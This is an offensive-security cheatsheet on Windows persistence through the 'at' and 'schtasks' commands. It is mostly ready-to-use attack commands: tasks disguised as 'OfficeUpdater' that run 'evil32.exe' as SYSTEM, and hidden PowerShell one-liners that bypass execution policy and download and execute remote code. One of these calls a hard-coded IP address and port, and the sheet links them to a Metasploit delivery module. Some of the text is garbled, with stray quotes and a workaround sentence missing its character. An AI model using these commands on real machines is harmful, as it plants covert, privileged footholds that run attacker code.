---
id: 747e4ccb-2208-4d3f-aee3-52be0bba6c9e
name: Windows Task Scheduling
type: cheatsheet
verified: false
created_at: '2020-07-14T18:21:11.553089+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# Windows Task Scheduling

# Description

Schedule Windows Tasks to run commands or invoke powershell scripts triggered on different system events.

## Task Scheduling

**Command** ([[AT Executes as system and must be an Admin to run it. Check groups with whoami /groups]]):

```bash
at 13:20 /interactive cmd net user \\target /user:Domain\user pass
net time \\target
at \\target 13:20 c:\temp\evil.bat

```

## SCHTASKS

Any user can create a task

**Command** ([[Schedule Task to run on System Startup]]):

```bash
schtasks /create /TN OfficeUpdaterA /tr ""c:\evil32.exe" -k password -n services" /SC onstart /RU system /RL HIGHEST
```

**Command** ([[Schedule Task to run on User Login]]):

```bash
schtasks /create /TN OfficeUpdaterB /tr ""c:\evil32.exe" -k password -n services" /SC onlogon
```

**Command** ([[Schedule Task to run on Idle]]):

```bash
schtasks /create /TN OfficeUpdaterC /tr ""c:\evil32.exe" -k password -n services" /SC onidle /i 30''''
```

## 

## Schedule Powershell Tasks

Use the Powershell Web Delivery (Download and Execute) module in Metasploit ‘exploit\windows\misc\psh_web_delivery’

**Command** ([[(X86) - On User Login]]):

```powershell
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'" /sc onlogon /ru System

```

**Command** ([[(X86) - On System Start]]):

```powershell
schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'" /sc onstart /ru System

```

**Command** ([[(X86) - On User Idle (30mins)]]):

```powershell
schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'" /sc onidle /i 30

```

**Command** ([[(X64) - On User Login]]):

```powershell
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'" /sc onlogon /ru System

```

**Command** ([[(X64) - On System Start]]):

```powershell
schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'" /sc onstart /ru System

```

**Command** ([[(X64) - On User Idle (30mins)]]):

```powershell
schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30

```

# Additional Notes

Scheduled Tasks binary paths CANNOT contain spaces because everything after the first space in the path is considered to be a command-line argument. To workaround this behavior, enclose the /TR path parameter between backslash () AND quotation marks (“):

**Command** ([[Delete scheduled task without prompting]]):

```bash
schtasks /delete /f /TN taskname

```

**Command** ([[Detailed scheduled tasks listing]]):

```bash
schtasks /query /V /FO list

```

**Command** ([[View scheduled tasks log (for troubleshooting)]]):

```bash
notepad c:\windows\schedlgu.txt (Windows XP) notepad c:\windows\tasks\schedlgu.txt (Vista+)

```
